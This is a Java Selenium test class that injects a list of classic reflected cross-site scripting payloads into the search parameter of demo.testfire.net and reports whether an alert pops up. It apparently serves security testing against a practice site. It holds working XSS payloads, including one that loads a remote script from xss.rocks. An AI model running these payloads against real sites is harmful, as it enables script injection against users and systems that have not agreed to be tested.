package UI;

import org.openqa.selenium.Alert;
import org.openqa.selenium.NoAlertPresentException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.edge.EdgeDriver;

import io.github.bonigarcia.wdm.WebDriverManager;

public class XSSInjectionTest {

	// Browser to use for testing (Chrome by default, can be Edge).
	public static String browser = "Chrome";

	// WebDriver instance to control the browser.
	public static WebDriver driver;

	// Sets up and initializes the chosen web browser.
	public static void setUpDriver() {
		if (browser.equalsIgnoreCase("Edge")) {
			WebDriverManager.edgedriver().setup();
			driver = new EdgeDriver();
		} else {
			WebDriverManager.chromedriver().setup();
			driver = new ChromeDriver();
		}
		driver.manage().window().maximize();
	}

	// Pauses execution for a specified number of seconds.
	public static void pause(int seconds) {
		try {
			Thread.sleep(seconds * 1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
			Thread.currentThread().interrupt();
		}
	}

	public static void main(String[] args) {
		// Initialize the browser.
		setUpDriver();
		System.out.println("🧪 Starting XSS Injection test on demo.testfire.net");

		// Array of common XSS payloads to attempt.
		String[] xssPayloads = { "<script>alert('XSS')</script>", "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
				"<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=javascript:alert('XSS')>",
				"<IMG SRC=JaVaScRiPt:alert('XSS')>", "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
				"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
				"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
				"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "<IMG SRC=# onmouseover=\"alert('xxs')\">",
				"<IMG SRC= onmouseover=\"alert('xxs')\">", "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
				"<BODY ONLOAD=alert('XSS')>" };

		// The base URL for the target search page.
		// For demo.testfire.net, the 'query' parameter is often used for XSS testing.
		String targetUrlBase = "http://demo.testfire.net/search.jsp?query=";

		// Loop through each XSS payload and test it.
		for (int i = 0; i < xssPayloads.length; i++) {
			String payload = xssPayloads[i];
			System.out.println("🔁 Attempt #" + (i + 1) + " with payload: " + payload);

			// Inject the payload directly into the URL's GET parameter.
			// This simulates a reflected XSS attack where user input in the URL is
			// immediately displayed on the page without proper sanitization.
			driver.get(targetUrlBase + payload);

			// Attempt to detect if an alert box (popup) appeared.
			try {
				// Switch to the alert and get its text.
				Alert alert = driver.switchTo().alert();
				String alertText = alert.getText();
				System.out.println("🚨 Possible XSS success! Alert displayed with text: " + alertText);
				alert.accept(); // Close the alert box.
				// You could add a 'break;' here if you want to stop after the first successful
				// XSS.
			} catch (NoAlertPresentException e) {
				// If no alert is present, the payload might not have executed an alert.
				// You could add a check here for the payload in the page source if you're
				// looking for reflected XSS without alert execution.
				System.out.println("❌ No alert appeared for this payload.");
			}
			pause(1); // Short pause between attempts.
		}

		pause(3); // Final pause before closing.
		driver.quit(); // Close the browser.
		System.out.println("🔚 Test completed.");
	}
}
